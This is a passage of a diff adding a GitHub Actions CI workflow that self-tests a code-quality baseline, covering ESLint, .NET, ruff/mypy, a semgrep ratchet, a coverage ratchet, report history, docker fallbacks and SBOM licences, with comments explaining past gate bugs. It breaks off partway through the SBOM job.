@@ -1,0 +1,1288 @@
+# maxi-quality — self-test (issue #6).
+#
+# samples/ is the test suite. Most samples are intentionally BAD and the jobs
+# assert that a gate FIRES: a green run means "the baseline still rejects what
+# it must reject, with exactly the documented counts". If a sample stops
+# failing — or fails with a different count — the config regressed; fix the
+# config, never the sample (CLAUDE.md §5).
+#
+# The `-clean` samples are the other direction: they must PASS with zero
+# findings. Both halves matter. A config that flags everything is as useless as
+# one that flags nothing, and the "clean code passes" half was documented long
+# before anything tested it.
+#
+# THE ASSERTION IS THE SET OF FINDINGS, NOT A COUNT.
+#
+# Every gate here used to grep for a total — "8 problems", "13 Error(s)",
+# "32 findings". A total answers "did roughly the right amount fire?" and
+# nothing else, so a rule could stop firing while another fired once more and
+# the number never moved. That is not hypothetical: `sql-string-concat-ts`
+# shipped with only its double-quoted branch and 28/19 stayed green over the gap
+# for months (STATUS §4). Worse, configs/typescript enables 140 ESLint rules and
+# the "8 problems" grep pinned 8 of them.
+#
+# So each sample now has a committed manifest in samples/expected/ listing every
+# finding as rule id + file + line, and scripts/check-expected.py diffs the tool's
+# own machine-readable output against it. A regression NAMES the rule that
+# stopped firing. Counts are still printed, as a summary, not as the assertion.
+#
+# Regenerate a manifest with `--update` when a fixture or rule genuinely changes,
+# and say in the commit message what changed and why the new set is correct
+# (CONTRIBUTING.md rule 2). CI never passes `--update`: a gate that can rewrite
+# its own expectations is not a gate.
+
+name: ci
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  layer1-typescript:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7
+        with:
+          node-version: '24'
+          cache: npm
+      - run: npm ci
+      # THE FIXTURE CANNOT PROVE THE CONFIG. samples/typescript triggers 8 rules;
+      # the baseline enables 140. Everything the fixture does not bait can be
+      # deleted with every finding assertion still green — measured: replacing
+      # the shared config with an 18-line file that drops recommended,
+      # strictTypeChecked and stylisticTypeChecked and hand-lists those 8 rules
+      # left both TS steps passing. So the enabled rule SET, with its options, is
+      # asserted directly. This is the only check that sees `no-misused-promises`
+      # being switched off, or `eqeqeq`'s options reverted to the default.
+      - name: The enabled ESLint rule set must not change silently
+        shell: bash
+        run: node scripts/snapshot-eslint-rules.mjs --check
+      - name: Sample must fail with exactly the expected findings
+        shell: bash
+        run: |
+          # The runner's bash defaults to -e; a plain `out=$(failing)` would
+          # kill the step before rc is captured. `|| rc=$?` is the -e-safe form.
+          set -uo pipefail
+          # Two assertions, deliberately separate. First the GATE behaviour a
+          # consumer actually gets — `--max-warnings 0` and a non-zero exit...
+          rc=0; out=$(npm run verify:ts 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -eq 0 ]]; then
+            echo '::error::samples/typescript passed the lint — the config regressed'
+            exit 1
+          fi
+          # ...then WHICH rules fired. eslint is re-run for JSON rather than
+          # parsed out of the human output: the formatter is a stable contract,
+          # the pretty output is not.
+          (cd samples/typescript && ../../node_modules/.bin/eslint src -f json) > /tmp/eslint.json || true
+          python3 scripts/check-expected.py --tool eslint \
+            --input /tmp/eslint.json --expected samples/expected/eslint.json
+      # The other half of the claim. A gate that flags everything is as useless
+      # as one that flags nothing, and this was asserted in the docs long before
+      # anything tested it.
+      - name: Clean TS sample must PASS with zero findings
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(npm run verify:ts:clean 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -ne 0 ]]; then
+            echo '::error::samples/typescript-clean was flagged — the baseline is over-strict. Fix the config, do not add disable comments to the fixture.'
+            exit 1
+          fi
+          # An empty manifest, checked the same way as the others: when the
+          # baseline does become over-strict, this names the rule that fired
+          # instead of leaving a bare non-zero exit to be diagnosed by hand.
+          (cd samples/typescript-clean && ../../node_modules/.bin/eslint src -f json) > /tmp/eslint-clean.json || true
+          python3 scripts/check-expected.py --tool eslint \
+            --input /tmp/eslint-clean.json --expected samples/expected/eslint-clean.json
+
+  layer1-dotnet:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: '10.0.x'
+      # NOT `working-directory:` — the manifests hold repo-relative paths, so
+      # check-expected.py has to run from the repo root.
+      - name: Sample must fail with exactly the expected diagnostics
+        shell: bash
+        run: |
+          # -e-safe capture — see the TS job.
+          set -uo pipefail
+          rc=0; out=$(cd samples/dotnet && dotnet build 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -eq 0 ]]; then
+            echo '::error::samples/dotnet built successfully — the config regressed'
+            exit 1
+          fi
+          # ANCHORED. A bare `grep -q '0 Warning(s)'` is a substring match and is
+          # satisfied by "10 Warning(s)" — the same bug that let the Tests job
+          # accept 13 errors while asserting 3.
+          if ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
+            echo '::error::expected 0 Warning(s) — TreatWarningsAsErrors regressed'
+            exit 1
+          fi
+          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
+            --input - --expected samples/expected/dotnet.json
+      - name: Clean C# sample must BUILD with 0 errors, 0 warnings
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(cd samples/dotnet-clean && dotnet build --nologo --no-incremental 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -ne 0 ]]; then
+            echo '::error::samples/dotnet-clean failed to build — the baseline is over-strict. Fix the config, do not add NoWarn to the fixture.'
+            exit 1
+          fi
+          # Anchored, for the reason given in the bad-sample step above: the
+          # unanchored form is satisfied by "10 Error(s)" and "20 Warning(s)".
+          if ! grep -qE '^ +0 Error\(s\)$' <<<"$out" || ! grep -qE '^ +0 Warning\(s\)$' <<<"$out"; then
+            echo '::error::expected 0 Error(s) and 0 Warning(s)'
+            exit 1
+          fi
+          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
+            --input - --expected samples/expected/dotnet-clean.json
+
+  # #25 — the test-project relaxation, asserted from BOTH sides. A one-sided
+  # check would pass just as happily if the waiver swallowed everything.
+  layer1-dotnet-tests:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6
+        with:
+          dotnet-version: '10.0.x'
+      - name: Waived rules silent, non-waived rules still firing
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(cd samples/dotnet-tests && dotnet build --nologo --no-incremental 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -eq 0 ]]; then
+            echo '::error::samples/dotnet-tests built clean — the dead-fixture gate regressed'
+            exit 1
+          fi
+          # Side 1: the non-waived rules must still bite in a Tests project.
+          for id in CS0414 IDE0051 S1144; do
+            grep -q "error $id" <<<"$out" || {
+              echo "::error::$id no longer fires in a Tests project — the NoWarn list is too broad"
+              exit 1
+            }
+          done
+          # Side 2: the waived test idioms must stay silent.
+          for id in S1199 CA1822 S2325; do
+            if grep -q "error $id" <<<"$out"; then
+              echo "::error::$id fired in a Tests project — the #25 relaxation regressed"
+              exit 1
+            fi
+          done
+          # THIS PAIR WAS THE BUG. `grep -q '3 Error(s)'` is a substring match,
+          # so it is satisfied by "13 Error(s)" — this job passed green on a
+          # build with thirteen errors, ten of them undetected defects. Same for
+          # "0 Warning(s)" against "10 Warning(s)". Anchored now, and the
+          # manifest below makes the count a consequence rather than the claim.
+          grep -qE '^ +3 Error\(s\)$' <<<"$out" || {
+            echo '::error::expected exactly 3 Error(s) — the finding count drifted'; exit 1; }
+          grep -qE '^ +0 Warning\(s\)$' <<<"$out" || {
+            echo '::error::expected 0 Warning(s)'; exit 1; }
+          printf '%s' "$out" | python3 scripts/check-expected.py --tool dotnet \
+            --input - --expected samples/expected/dotnet-tests.json
+
+  # #15 — Python Layer 1. Two tools, asserted separately on purpose: ruff and
+  # mypy catch genuinely different classes of bug, and a combined count would
+  # let one tool's config silently break while the other's findings kept the
+  # total looking plausible.
+  layer1-python:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7
+        with:
+          python-version: '3.12'
+      - run: pip install -r samples/python/requirements-dev.txt
+      - name: Ruff sample must fail with exactly 14 errors
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(ruff check --output-format=concise samples/python 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -eq 0 ]]; then
+            echo '::error::samples/python passed ruff — the config regressed'
+            exit 1
+          fi
+          ruff check --output-format=json samples/python > /tmp/ruff.json || true
+          python3 scripts/check-expected.py --tool ruff \
+            --input /tmp/ruff.json --expected samples/expected/ruff.json
+      # All 13 selected families must actually be firing. Without this, half the
+      # ruleset could be switched off and the count above could still be 14 —
+      # the count proves "something fires", this proves "the right things do".
+      - name: Every selected rule family must be represented
+        shell: bash
+        run: |
+          set -uo pipefail
+          out=$(ruff check --output-format=concise samples/python 2>&1) || true
+          missing=()
+          for fam in E W F I B C4 UP N SIM ASYNC S T20 RUF; do
+            if ! grep -qE ":[0-9]+:[0-9]+: ${fam}[0-9]" <<<"$out"; then
+              missing+=("$fam")
+            fi
+          done
+          if [[ ${#missing[@]} -gt 0 ]]; then
+            echo "::error::no finding from rule ${missing[*]} — that family is selected but unproven"
+            exit 1
+          fi
+          echo 'OK: all 13 rule families represented in the fixture'
+      - name: Mypy sample must fail with exactly 5 errors
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(mypy --config-file configs/python/mypy.ini samples/python/src 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -eq 0 ]]; then
+            echo '::error::samples/python passed mypy — the strict config regressed'
+            exit 1
+          fi
+          mypy --config-file configs/python/mypy.ini --output=json samples/python/src \
+            > /tmp/mypy.json || true
+          python3 scripts/check-expected.py --tool mypy \
+            --input /tmp/mypy.json --expected samples/expected/mypy.json
+      # The other direction. Idiomatic modern Python must survive the baseline,
+      # or the baseline is unadoptable regardless of what it catches.
+      - name: Clean Python sample must PASS both tools with zero findings
+        shell: bash
+        run: |
+          set -uo pipefail
+          rc=0; out=$(ruff check --output-format=concise samples/python-clean 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -ne 0 ]]; then
+            echo '::error::samples/python-clean was flagged by ruff — the baseline is over-strict. Fix the config, do not add noqa to the fixture.'
+            exit 1
+          fi
+          rc=0; out=$(mypy --config-file configs/python/mypy.ini samples/python-clean/src 2>&1) || rc=$?
+          echo "$out"
+          if [[ $rc -ne 0 ]]; then
+            echo '::error::samples/python-clean was flagged by mypy — the baseline is over-strict. Fix the config, do not add type: ignore to the fixture.'
+            exit 1
+          fi
+          echo 'OK: clean Python sample passes ruff and mypy with zero findings'
+
+  # The ratchet (`--changed-only`) had NO test, and shipped broken: semgrep's
+  # --baseline-commit resolves the ref against the git repo of its WORKING
+  # DIRECTORY, and scan.sh never cd'd into the target. It diffed the wrong
+  # repository, reported zero findings, and printed "Scan was limited to files
+  # changed since baseline commit" while checking nothing — a permanently green
+  # gate for any consumer adopting with the ratchet.
+  #
+  # Asserting BOTH directions is the point. "0 findings" alone was exactly the
+  # broken behaviour, so a test that only checked grandfathering would have
+  # passed against the bug.
+  ratchet:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: changed-only must grandfather old findings AND catch new ones
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          R=/tmp/ratchet-fixture
+          rm -rf "$R" && mkdir -p "$R"
+          git -C "$R" init -q
+          git -C "$R" config user.email t@example.com
+          git -C "$R" config user.name test
+
+          # Baseline commit: one PRE-EXISTING violation.
+          printf 'export function a() { return new Date(); }\n' > "$R/old.ts"
+          git -C "$R" add -A
+          git -C "$R" commit -qm baseline
+          BASE=$(git -C "$R" rev-parse HEAD)
+
+          # Sanity: a full scan sees the pre-existing violation. Without this,
+          # a fixture that simply never matched would satisfy the test below.
+          # --no-fail makes scan.sh exit 0 regardless, so no rc capture is needed.
+          out=$(./scripts/scan.sh "$R" --no-fail 2>&1) || true
+          grep -q 'no-ambient-clock' <<<"$out" || {
+            echo '::error::fixture is inert — full scan found no violation, so the ratchet assertions prove nothing'
+            exit 1
+          }
+
+          # Direction 1: nothing new -> the old finding must be grandfathered.
+          out=$(./scripts/scan.sh "$R" --changed-only "$BASE" --no-fail 2>&1) || true
+          if grep -qE 'Findings: [1-9]' <<<"$out"; then
+            echo "$out"
+            echo '::error::ratchet reported a finding with no new code — grandfathering is broken'
+            exit 1
+          fi
+
+          # Direction 2: a NEW violation must fire. This is the half that was broken.
+          printf 'export function b() { return new Date(); }\n' > "$R/new.ts"
+          git -C "$R" add -A
+          git -C "$R" commit -qm 'new violation'
+          out=$(./scripts/scan.sh "$R" --changed-only "$BASE" --no-fail 2>&1) || true
+          echo "$out"
+          if ! grep -q 'Findings: 1 ' <<<"$out"; then
+            echo '::error::ratchet did NOT report exactly 1 new finding — --changed-only is a no-op gate again'
+            exit 1
+          fi
+          grep -q 'new.ts' <<<"$out" || {
+            echo '::error::the reported finding is not the new one'; exit 1; }
+          echo 'OK: ratchet grandfathers old findings and catches new ones'
+
+  # The report issue's body IS the persistence layer, so the read-back path is
+  # the whole feature. If parsing the previous body silently returns nothing,
+  # every run looks fine and history resets to one row forever — a data-loss
+  # bug that presents as a working report.
+  quality-report:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Report must accumulate history, not reset it
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          F=/tmp/findings.json
+          cat > "$F" <<'JSON'
+          {"results":[
+            {"check_id":"a.b.no-ambient-clock"},
+            {"check_id":"a.b.no-ambient-clock"},
+            {"check_id":"a.b.debug-print-left-behind-ts"}
+          ]}
+          JSON
+          # An array, NOT ${2:+--previous-body "$2"} — that collapses into a
+          # single argv token and argparse rejects the lot.
+          gen() {
+            local -a a=(--json "$F" --date "$1" --target demo/repo
+                        --gitleaks clean --osv clean)
+            [[ -n "${2:-}" ]] && a+=(--previous-body "$2")
+            python3 scripts/quality-report.py "${a[@]}"
+          }
+
+          gen 2026-01-01            > /tmp/b1.md
+          gen 2026-01-08 /tmp/b1.md > /tmp/b2.md
+          gen 2026-01-15 /tmp/b2.md > /tmp/b3.md
+
+          grep -q '| 3 |' /tmp/b1.md || grep -q '\*\*3\*\*' /tmp/b1.md || {
+            echo '::error::total finding count missing from the report'; exit 1; }
+
+          # Assert the FULL ordering, not the count and the top row.
+          #
+          # Checking only those two is what let a real ordering bug ship: the
+          # table renders newest-first, so the rows are read back in reverse
+          # chronological order, and treating that list as chronological
+          # scrambled everything in the middle. Three runs rendered
+          # 15, 01, 08 — correct count, correct top row, wrong table. Caught by
+          # the acceptance canary, not by this job.
+          dates() { grep -oE '^\| [0-9]{4}-[0-9]{2}-[0-9]{2}' "$1" | tr -d '| ' | tr '\n' ' '; }
+          expect() {
+            local got; got="$(dates "$1")"
+            if [[ "$got" != "$2 " ]]; then
+              echo "::error::history is [$got], expected [$2 ] — $3"
+              sed -n '/## History/,$p' "$1"
+              exit 1
+            fi
+          }
+          expect /tmp/b3.md '2026-01-15 2026-01-08 2026-01-01' \
+                 'rows must be newest-first in full, not just at the top'
+
+          # A second run on the same day must REPLACE that day's row. The
+          # history is a daily series; the canary runs on both push and
+          # pull_request and produced two identical rows.
+          gen 2026-01-15 /tmp/b3.md > /tmp/b3b.md
+          expect /tmp/b3b.md '2026-01-15 2026-01-08 2026-01-01' \
+                 'a same-day rerun appended a duplicate row instead of replacing it'
+
+          # And a row arriving out of order still sorts into place.
+          gen 2026-01-05 /tmp/b3b.md > /tmp/b3c.md
+          expect /tmp/b3c.md '2026-01-15 2026-01-08 2026-01-05 2026-01-01' \
+                 'an out-of-order date was appended rather than sorted'
+
+          # A body it cannot parse must not silently wipe history.
+          echo 'garbage, no history heading' > /tmp/junk.md
+          gen 2026-02-01 /tmp/junk.md > /tmp/b4.md
+          grep -q '2026-02-01' /tmp/b4.md || {
+            echo '::error::report failed on an unparseable previous body'; exit 1; }
+          echo 'OK: history accumulates, stays newest-first, survives a junk body'
+
+      - name: Dependency table must read all three CycloneDX licence spellings
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          out=$(python3 scripts/quality-report.py --json /tmp/findings.json \
+                  --date 2026-03-01 --sbom samples/sbom/cyclonedx.json)
+          echo "$out"
+          grep -q '^6 resolved components' <<<"$out" || {
+            echo '::error::component count wrong'; exit 1; }
+          # id AND name spellings must fold into one MIT row; the expression and
+          # the two licence-less components must survive as their own rows.
+          # The `.` stands in for the backtick the report wraps each licence in
+          # — a literal backtick inside single quotes trips SC2016 and this file
+          # is linted by the same actionlint it ships.
+          row() {
+            grep -qE "^\| .$1. \| $2 \|$" <<<"$out" || {
+              echo "::error::$3"; exit 1; }
+          }
+          row 'MIT'               2 'license.id + license.name did not both count as MIT'
+          row 'Apache-2.0'        1 'Apache-2.0 row missing'
+          row 'MIT OR Apache-2.0' 1 'the SPDX expression form was dropped'
+          row 'UNKNOWN'           2 'licence-less components were not counted as UNKNOWN'
+
+          # A broken SBOM must cost the dependency table and NOTHING else. The
+          # history is the irreplaceable part; a re-runnable inventory is not.
+          echo 'not json at all' > /tmp/bad-sbom.json
+          out=$(python3 scripts/quality-report.py --json /tmp/findings.json \
+                  --date 2026-03-02 --sbom /tmp/bad-sbom.json --previous-body /tmp/b3.md)
+          # An `if`, not `grep -q ... && { exit 1; }`: this step runs under
+          # `set -e`, where the && form aborts precisely when grep finds
+          # nothing — i.e. on the PASSING path. The SC2015 trap.
+          if grep -q '## Dependencies' <<<"$out"; then
+            echo '::error::a malformed SBOM produced a dependency section anyway'
+            exit 1
+          fi
+          n=$(grep -cE '^\| 2026-0[0-9]-[0-9]{2} \|' <<<"$out" || true)
+          [[ "$n" -eq 4 ]] || {
+            echo "::error::a malformed SBOM cost the report its history ($n rows, expected 4)"; exit 1; }
+          echo 'OK: dependency table parses every licence shape and fails soft'
+
+  # The coverage ratchet, asserted in BOTH directions and on every parse path.
+  #
+  # The failure mode that matters is not "it reported the wrong percentage", it
+  # is "it reported a percentage at all when it should have refused". A coverage
+  # run that produced nothing must never read as 100%, and a floor file that
+  # cannot be parsed must never read as "no floor yet" — both turn the ratchet
+  # into a permanently green step, which is the shape of every gate bug this
+  # repo has actually hit.
+  coverage-ratchet:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Both report formats must parse to the documented numbers
+        shell: bash
+        run: |
+          set -uo pipefail
+          cov() { python3 scripts/coverage.py "$@" 2>/dev/null | sed -n 's/^coverage=//p'; }
+          F=/tmp/none.json
+
+          # lcov 13/20 = 65.00 · cobertura 30/40 = 75.00 · both = 43/60 = 71.67
+          got=$(cov --report samples/coverage/lcov.info --floor-file "$F")
+          [[ "$got" == "65.00" ]] || { echo "::error::lcov parsed as $got, expected 65.00"; exit 1; }
+          got=$(cov --report samples/coverage/cobertura.xml --floor-file "$F")
+          [[ "$got" == "75.00" ]] || { echo "::error::cobertura parsed as $got, expected 75.00"; exit 1; }
+          got=$(cov --report samples/coverage/lcov.info --report samples/coverage/cobertura.xml --floor-file "$F")
+          [[ "$got" == "71.67" ]] || { echo "::error::merged reports parsed as $got, expected 71.67"; exit 1; }
+
+          # The fallback paths: no LF:/LH: summary, and no lines-valid attribute.
+          got=$(cov --report samples/coverage/lcov-no-summary.info --floor-file "$F")
+          [[ "$got" == "40.00" ]] || { echo "::error::DA-only lcov parsed as $got, expected 40.00"; exit 1; }
+          got=$(cov --report samples/coverage/cobertura-no-summary.xml --floor-file "$F")
+          [[ "$got" == "66.67" ]] || { echo "::error::attribute-less cobertura parsed as $got, expected 66.67"; exit 1; }
+
+          # cobertura.xml lists the SAME file under two <class> entries. If this
+          # ever reports 66.67 (4 of 6 <line> elements) instead of 75.00, the
+          # script started counting elements and coverlet multi-type files will
+          # silently drift.
+          echo 'OK: lcov + cobertura, summary and fallback paths, all exact'
+
+      - name: A drop must fail, a rise must never lower the floor
+        shell: bash
+        run: |
+          set -uo pipefail
+          F=/tmp/floor.json
+          run() { python3 scripts/coverage.py --floor-file "$F" "$@" >/dev/null 2>&1; echo $?; }
+
+          rm -f "$F"
+          [[ "$(run --report samples/coverage/cobertura.xml --write)" == "0" ]] || {
+            echo '::error::first run should record a floor, not fail'; exit 1; }
+          grep -q '75' "$F" || { echo "::error::floor not written"; cat "$F"; exit 1; }
+
+          [[ "$(run --report samples/coverage/lcov.info)" == "1" ]] || {
+            echo '::error::65% against a 75% floor did NOT fail — the ratchet does not ratchet'; exit 1; }
+
+          # ...and the failed run must not have quietly moved the floor down to
+          # match. A ratchet that lowers itself on failure is a no-op with extra
+          # steps.
+          [[ "$(run --report samples/coverage/lcov.info --write)" == "1" ]] || {
+            echo '::error::--write turned a drop into a pass'; exit 1; }
+          grep -q '75' "$F" || { echo '::error::--write LOWERED the floor on a drop'; cat "$F"; exit 1; }
+
+          [[ "$(run --report samples/coverage/cobertura.xml)" == "0" ]] || {
+            echo '::error::holding at the floor should pass'; exit 1; }
+
+          echo '{"line": 50.0}' > "$F"
+          [[ "$(run --report samples/coverage/cobertura.xml)" == "0" ]] || {
+            echo '::error::a rise should pass'; exit 1; }
+          grep -q '50' "$F" || { echo '::error::the floor moved WITHOUT --write'; exit 1; }
+          [[ "$(run --report samples/coverage/cobertura.xml --write)" == "0" ]] || {
+            echo '::error::--write on a rise should pass'; exit 1; }
+          grep -q '75' "$F" || { echo '::error::--write did not raise the floor'; cat "$F"; exit 1; }
+          echo 'OK: drops fail, rises pass, the floor only ever goes up'
+
+      - name: Broken inputs must ERROR, never pass silently
+        shell: bash
+        run: |
+          set -uo pipefail
+          F=/tmp/floor2.json
+          run() { python3 scripts/coverage.py --floor-file "$F" "$@" >/dev/null 2>&1; echo $?; }
+
+          # 0 measurable lines is a broken coverage run. Reporting it as 100%
+          # would raise the floor to 100 and brick the repo's gate forever.
+          rm -f "$F"
+          printf 'TN:\nSF:x\nLF:0\nLH:0\nend_of_record\n' > /tmp/zero.info
+          [[ "$(run --report /tmp/zero.info --write)" == "3" ]] || {
+            echo '::error::a zero-line report was accepted'; exit 1; }
+          if [[ -f "$F" ]]; then
+            echo '::error::a broken run still wrote a floor'; exit 1
+          fi
+
+          [[ "$(run --report /does/not/exist.info)" == "3" ]] || {
+            echo '::error::a missing report did not error'; exit 1; }
+
+          # A corrupt floor must NOT be treated as "no floor yet" — that
+          # restarts the ratchet at whatever today happens to be.
+          echo 'garbage' > "$F"
+          [[ "$(run --report samples/coverage/cobertura.xml)" == "3" ]] || {
+            echo '::error::a corrupt floor file was treated as a fresh start'; exit 1; }
+          echo 'OK: broken inputs error out instead of going green'
+
+  # The three tool ladders are now ONE function. This job is what stops them
+  # drifting apart again — the last time they did, the docker path set semgrep's
+  # working directory and the native path did not, so `--changed-only` reported
+  # zero findings forever and looked like a working ratchet.
+  #
+  # It asserts on the RESOLVED COMMANDS, not on output: a fake `docker` on PATH
+  # records what would have been executed, so the docker branch is exercised on
+  # a runner that has none of the tools installed.
+  tool-resolution:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: The docker fallback must build the right commands
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          SHIM=/tmp/shim; rm -rf "$SHIM"; mkdir -p "$SHIM"
+          cat > "$SHIM/docker" <<'SH'
+          #!/usr/bin/env bash
+          [[ "$1" == "info" ]] && exit 0
+          { printf 'DOCKER:'; printf ' %s' "$@"; printf '\n'; } >> "$DOCKER_LOG"
+          exit 0
+          SH
+          chmod +x "$SHIM/docker"
+
+          R=/tmp/tool-fixture; rm -rf "$R"; mkdir -p "$R"
+          git -C "$R" init -q
+          git -C "$R" config user.email t@example.com
+          git -C "$R" config user.name test
+          echo 'const a = 1;' > "$R/a.ts"
+          git -C "$R" add -A && git -C "$R" commit -qm base
+
+          export DOCKER_LOG=/tmp/docker.log; : > "$DOCKER_LOG"
+          # A PATH with the shim and coreutils but NONE of the three tools, so
+          # every ladder is forced all the way down to its docker branch.
+          env PATH="$SHIM:/usr/bin:/bin" DOCKER_LOG="$DOCKER_LOG" \
+            ./scripts/scan.sh "$R" --sbom /tmp/out/sbom.json --licenses MIT >/dev/null 2>&1 || true
+          cat "$DOCKER_LOG"
+
+          n=$(wc -l < "$DOCKER_LOG")
+          [[ "$n" -eq 5 ]] || {
+            echo "::error::expected 5 docker invocations (semgrep, gitleaks, osv, licences, sbom), got $n"
+            exit 1; }
+
+          need() {
+            grep -qF -- "$1" "$DOCKER_LOG" || {
+              echo "::error::missing from the docker invocations: $1"; exit 1; }
+          }
+          # semgrep is the only tool needing a SECOND mount — the rules live
+          # outside the scanned repo — and the only one with a trailing
+          # entrypoint after the image name.
+          need '/baseline:ro'
+          need 'returntocorp/semgrep:latest semgrep --config /baseline/semgrep /repo'
+          # -w /repo is what made the docker path correct while native was not.
+          need '-w /repo ghcr.io/gitleaks/gitleaks:latest git /repo'
+          need 'ghcr.io/google/osv-scanner:latest scan source --recursive /repo'
+          need 'scan source --recursive --licenses=MIT /repo'
+          need 'scan source --recursive --all-packages --licenses'
+          echo 'OK: all three ladders resolve to the documented docker commands'
+
+      - name: An unavailable tool must SKIP loudly, not pass quietly
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          R=/tmp/tool-fixture2; rm -rf "$R"; mkdir -p "$R"; echo x > "$R/a.txt"
+
+          # A docker that always fails, placed FIRST on PATH. Trimming PATH is
+          # not enough: ubuntu runners ship docker in /usr/bin, so a restricted
+          # PATH still finds it and nothing would skip. This shim shadows it,
+          # and the trimmed PATH keeps the three tools out.
+          NODK=/tmp/nodocker; rm -rf "$NODK"; mkdir -p "$NODK"
+          printf '#!/usr/bin/env bash\nexit 1\n' > "$NODK/docker"
+          chmod +x "$NODK/docker"
+          SAFE="$NODK:/usr/bin:/bin"
+
+          rc=0
+          env PATH="$SAFE" ./scripts/scan.sh "$R" > /tmp/skip.log 2>&1 || rc=$?
+          cat /tmp/skip.log
+          for tool in semgrep gitleaks osv; do
+            grep -qE "^  $tool +SKIPPED" /tmp/skip.log || {
+              echo "::error::$tool did not record a SKIPPED line"; exit 1; }
+          done
+          # Without --require-tools this is a PASS (partial), exit 0 — the
+          # documented contract. Silent success would be the dangerous reading,
+          # so the summary has to say so out loud.
+          [[ $rc -eq 0 ]] || { echo "::error::expected exit 0 without --require-tools, got $rc"; exit 1; }
+          grep -q 'PASS (partial)' /tmp/skip.log || {
+            echo '::error::no "PASS (partial)" warning — an all-skipped scan looked like a clean one'; exit 1; }
+
+          rc=0
+          env PATH="$SAFE" ./scripts/scan.sh "$R" --require-tools > /tmp/req.log 2>&1 || rc=$?
+          [[ $rc -eq 2 ]] || { echo "::error::--require-tools should exit 2 when a tool is missing, got $rc"; exit 1; }
+          echo 'OK: missing tools skip loudly, and --require-tools turns that into a failure'
+
+  # SBOM + licence gate, against this repo's own real dependency tree.
+  #
+  # The assertion that earns its keep is "the SBOM carries licence data". Bare
+  # `--licenses` (no allowlist) is what makes osv-scanner RESOLVE licences; with
+  # it omitted every component comes back as `"licenses": []` and the report
+  # renders a tidy table of N UNKNOWNs. That version looked completely fine.
+  #
+  # There is deliberately no "passes with the right allowlist" case: it would
+  # have to spell out this repo's whole transitive licence set, which Dependabot
+  # changes most weeks. Both directions are covered instead by "an impossible
+  # allowlist fires" and "no allowlist does not".
+  sbom-licenses:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+      - name: Install the SAME osv-scanner the layer2 action pins
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          # Read the version out of the action rather than repeating it — a
+          # second copy of a pin is a second thing to forget, and check-pins.sh
+          # would not know about this one.
+          V=$(awk '
+                /^  osv-scanner-version:/ { f = 1; next }
+                f && /default:/ { gsub(/.*default: *'"'"'/, ""); gsub(/'"'"'.*/, ""); print; exit }
+              ' actions/layer2/action.yml)
+          [[ -n "$V" ]] || { echo '::error::could not read the pinned osv-scanner version'; exit 1; }
+          echo "pinned osv-scanner: $V"
+          # The digest comes out of the action too, for the same reason the
+          # version does: a second copy of a pin is a second thing to forget.
+          S=$(awk '
+                /^  osv-scanner-sha256:/ { f = 1; next }
+                f && /default:/ { gsub(/.*default: *'"'"'/, ""); gsub(/'"'"'.*/, ""); print; exit }
+              ' actions/layer2/action.yml)
+          [[ -n "$S" ]] || { echo '::error::could not read the pinned osv-scanner sha256'; exit 1; }
+          curl -sSfL -o /tmp/osv-scanner \
+            "https://github.com/google/osv-scanner/releases/download/${V}/osv-scanner_linux_amd64"
+          # A release asset at a fixed tag is mutable — the same argument
+          # SECURITY.md makes about `uses:` tags. Verify before executing.
+          echo "${S}  /tmp/osv-scanner" | sha256sum -c -
+          sudo install -m 0755 /tmp/osv-scanner /usr/local/bin/osv-scanner
+          osv-scanner --version
+
+      - name: SBOM must be produced AND carry licence data
+        shell: bash
+        run: |
+          set -Eeuo pipefail
+          # A nested path on purpose: osv-scanner exits 127 rather than creating
+          # the output directory, and scan.sh mkdir -p's it. Measured.
